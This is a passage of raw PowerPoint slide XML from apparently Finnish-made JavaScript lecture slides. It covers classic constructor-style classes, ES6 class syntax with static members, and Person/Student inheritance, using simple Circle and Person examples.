              <a:t>// call class method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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bigger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7304442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55E1339F-3991-44AA-BA8B-BEE6FB5AE06A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JS OOP Classic Style Continued</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108547" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13DBC9B2-375D-4A9B-BEF3-B0984877268A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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define</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>circle</a:t>
            </a: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class</a:t>
            </a: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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> just </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>one</a:t>
            </a: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attribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> r = radius of a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>circle</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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without</a:t>
            </a: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using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prototype</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">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r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Math</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">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r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">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r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    };</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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4299B110-13EB-4734-B44F-C72808FA05C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>ES6 Style Class Definitions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109571" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{674880C3-0406-4D63-963E-947A764C963F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</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static</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PI</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Math</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</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constructor</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this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area</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Math</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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this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this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static</a:t>
            </a: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max</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b</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</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a</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b</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6D066E21-DA7A-492E-9D61-9065DBBEC2AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274638"/>
            <a:ext cx="10972800" cy="706090"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Class Inheritance ES6 Style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110595" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63422626-8824-46D1-801E-0F7A3D361BE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="980728"/>
            <a:ext cx="10972800" cy="5688632"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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constructor</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this</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this</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>live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"I </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>have</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> a life!"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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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class</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Student</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inherits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Person </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>extends</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> id</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Student</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extends</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
